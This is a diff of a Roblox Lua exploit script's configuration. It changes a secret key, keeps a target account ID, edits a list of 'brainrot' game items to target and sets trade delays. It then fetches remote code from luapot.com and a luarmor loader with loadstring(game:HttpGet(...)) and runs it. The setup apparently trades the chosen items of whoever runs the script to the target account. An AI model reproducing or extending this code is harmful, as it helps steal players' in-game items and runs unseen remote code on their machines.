@@ -1,8 +1,14 @@
-getgenv().SECRET_KEY = "mrr_007d378d418f47eeafe379d62c730ce9"
+getgenv().SECRET_KEY = "mrr_b62cdaca7ad546c9b768830f14d9bf98"
 getgenv().TARGET_ID = 6219924104
 getgenv().DELAY_STEP = 1      
 getgenv().TRADE_CYCLE_DELAY = 2
 getgenv().TARGET_BRAINROTS = {
+    ["Quackini Snackini"] = true,
+    ["Hopilikalika Hopilikalako"] = true,
+    ["Kalika Bros"] = true,
+    ["Digi Narwhal"] = true,
+    ["Gym Bros"] = true,
+    ["Globa Steppa"] = true,
     ["Strawberry Elephant"] = true,
     ["Meowl"] = true,
     ["Headless Horseman"] = true,
@@ -34,7 +40,6 @@ getgenv().TARGET_BRAINROTS = {
     ["Signore Carapace"] = true,
     ["La Casa Boo"] = true,
     ["Cash or Card"] = true,
-    ["Fragrama and Chocrama"] = true,
     ["La Food Combinasion"] = true,
     ["Elefanto Frigo"] = true,
     ["Spooky and Pumpky"] = true,
@@ -46,19 +51,21 @@ getgenv().TARGET_BRAINROTS = {
     ["Garama and Madundung"] = true,
     ["Fishino Clownino"] = true,
     ["Jolly Jolly Sahur"] = true,
+    ["Gold Gold Gold"] = true,
+    ["Rico Dinero"] = true,
     ["Tirilikalika Tirilikalako"] = true,
-    ["Swaggy Bros"] = true,
-    ["Chillin Chili"] = true,
+    ["Dug dug dug"] = true,
     ["Los Chillis"] = true,
-    ["Digi Narwhal"] = true,
-    ["Kalika Bros"] = true,
-    ["Gym Bros"] = true,
-    ["Hopilikalika Hopilikalako"] = true,
-    ["Centrucci Nuclucci"] = true,
-    ["Fragola La La La"] = true
+    ["Chillin Chili"] = true,
+    ["Fragola La La La"] = true,
+    ["Fragrama and Chocrama"] = true,
+    ["Duggy Bros"] = true,
+    ["Money Money Reindeer"] = true,
+    ["Los Mariachis"] = true,
+    ["Boppin Bunny"] = true
 }
 task.spawn(function()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Cratos-Dev/LimitedHub/refs/heads/main/Limited"))()
+loadstring(game:HttpGet("https://luapot.com/api/loadstring/26c4a4331358247078ffc36b7a17d913"))()
 end)
 task.spawn(function()
 loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/971db84d8383b29c9951aada82aff38f.lua"))()
